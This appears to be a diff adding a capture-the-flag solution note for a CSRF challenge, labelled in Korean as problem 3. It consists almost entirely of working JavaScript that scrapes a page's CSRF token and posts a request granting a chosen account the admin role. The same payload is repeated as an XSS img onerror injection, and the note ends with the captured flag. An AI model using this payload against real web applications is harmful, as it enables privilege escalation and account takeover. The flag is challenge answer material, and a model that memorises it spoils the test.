@@ -1,0 +1,27 @@
+========================
+
+* CSRF 문제 3번
+
+========================
+
+1. fetch('/csrfToken/update_role.jsp')
+    .then(response => response.text())
+    .then(html => {
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
+        const csrfToken = doc.querySelector('input[name="csrfToken"]').value;
+        const formData = new FormData();
+        formData.append('target_id', 'gggg@gggg.com');
+        formData.append('new_role', 'ADMIN_csrfToken');
+        formData.append('csrfToken', csrfToken); 
+
+        fetch('/csrfToken/update_role_ok_csrfToken.jsp', {
+            method: 'POST',
+            body: new URLSearchParams(formData)
+        });
+    });
+<img src=x onerror="fetch('/csrfToken/update_role.jsp').then(r=>r.text()).then(html=>{const p=new DOMParser();const d=p.parseFromString(html,'text/html');const t=d.querySelector('input[name=\'csrfToken\']').value;const f=new FormData();f.append('target_id','gggg@gggg.com');f.append('new_role','ADMIN_csrfToken');f.append('csrfToken',t);fetch('/csrfToken/update_role_ok_csrfToken.jsp',{method:'POST',body:new URLSearchParams(f)})});">
+
+2. EQST{c5rfT0k3n_byp4ss_FlA9}
+
+========================
